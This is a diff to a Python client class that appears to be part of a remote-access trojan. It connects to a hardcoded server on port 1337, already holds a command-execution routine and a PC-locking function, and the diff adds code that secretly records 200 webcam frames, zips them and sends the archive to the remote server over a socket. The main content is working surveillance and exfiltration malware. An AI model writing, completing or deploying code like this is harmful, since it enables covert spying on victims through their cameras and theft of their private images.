@@ -5,7 +5,9 @@ import subprocess
 import sys
 import time
 from pprint import pprint
+from zipfile import ZipFile
 
+import cv2
 from mss import mss
 
 
@@ -15,7 +17,7 @@ class Client:
         self.PORT = port
         self.BUFFER_SIZE = buffer_size
         self.CLIENT_IP = client_ip
-        # self.recvcounter = 0
+        self.recvcounter = 0
         self.sscount = 0
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -49,7 +51,8 @@ class Client:
         while True:
             input("Success - Reached the code loop")
             #self.sendHostInfo()
-            self.ssht()
+            self.capture()
+            input("Done")
 
     def runrun(self, msg):
         obj = "failed"
@@ -164,6 +167,66 @@ class Client:
             self.client.send("[+] PC Locked".encode("utf-8"))
         except:
             self.client.send("[!] LOCKING FAILED".encode("utf-8"))
+
+    def capture(self):
+        counter = 0
+        vc = cv2.VideoCapture(0)
+        if vc.isOpened():  # try to get the first frame
+            rval, frame = vc.read()
+            cv2.imwrite('./logs/Video/video{}.png'.format(counter), frame)
+            counter += 1
+        else:
+            rval = False
+        fr = 200
+        while fr > 0:  # rval:
+            fr -= 1
+            if len(str(counter)) < 4:
+                spacer = "0" * (4 - int((len(str(counter)))))
+            cv2.imwrite('./logs/Video/vid{}{}.png'.format(spacer, counter), frame)
+            counter += 1
+            print(str(counter))
+            rval, frame = vc.read()
+            cv2.waitKey(int(1000 / 24))
+        vc.release()
+        print("Sending: ")
+        #time.sleep(10)
+        self.webcamsend()
+
+    def webcamsend(self):
+        print("sendloop")
+
+        #self.client.send("Success".encode())
+        print("sendsuccess")
+
+
+        # create a zip archive
+        archname = f'./logs/webcam{str(self.recvcounter)}.zip'
+        archive = ZipFile(archname, 'w')
+        print("zipcreated + " + archname)
+
+        filePath = './logs/Video'
+        with os.scandir(filePath) as entries:
+            print(str(len(entries)))
+            for entry in entries:
+                print(entry.name)
+                p = str(filePath) + str("/") + str(entry.name)
+                archive.write(p)
+        archive.close()
+        print("test")
+
+        # send size
+        archivesize = os.path.getsize(archname)
+
+        #self.client.send(str(archivesize).encode("utf-8"))
+        time.sleep(0.5)
+
+        # send archive
+        with open(archname, 'rb') as to_send:
+            self.client.send(to_send.read())
+            print("Should have worked.")
+        # os.remove(archname)
+
+
 def main():
     SERVER_IP = "192.168.56.1"  # modify me
     PORT = 1337  # modify me (if you want)
